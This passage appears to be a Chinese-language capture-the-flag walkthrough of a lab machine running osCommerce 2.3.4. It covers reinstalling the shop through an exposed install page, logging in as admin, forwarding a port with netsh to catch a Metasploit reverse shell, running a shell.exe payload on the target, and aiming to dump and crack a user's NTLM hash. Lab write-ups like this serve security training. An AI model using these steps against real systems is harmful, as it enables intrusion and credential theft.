访问扫描出来的地址，在 /oscommerce-2.3.4/catalog/install 发现一个安装页面

点击开始按钮安装

这里数据库服务器地中默认是 localhost，但是我修改为靶场地址后会出错，因此需要修改 hosts 文件

用户名用 root，无密码，数据库名则是 osCommerce

点击继续按钮

点击继续按钮

其他信息乱填，管理员账号密码均为 admin

访问 /admin，可以登录

第一个题目要求我们获取 lab 用户的 NTML hash 值并解密

msf 里面有一个 hashdump命令 可以获取该值

我这里比较特殊，我是 win11 用 openvpn 连接的靶场，所以 kali 虚拟机能访问靶场地址，但是无法接受靶场的反弹，因此需要进行端口转发

netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=4444 connectaddress=192.168.80.128

进入 msfconsole，使用 exploit/multi/handler 模块，设置 port 以及 ip，然后 run 开启监听

再去之前的 shell 处运行 shell.exe

BLUEPRINT$@BLUEPRINT:C:\xampp\htdocs\oscommerce-2.3.4\catalog\admin# shell.exe
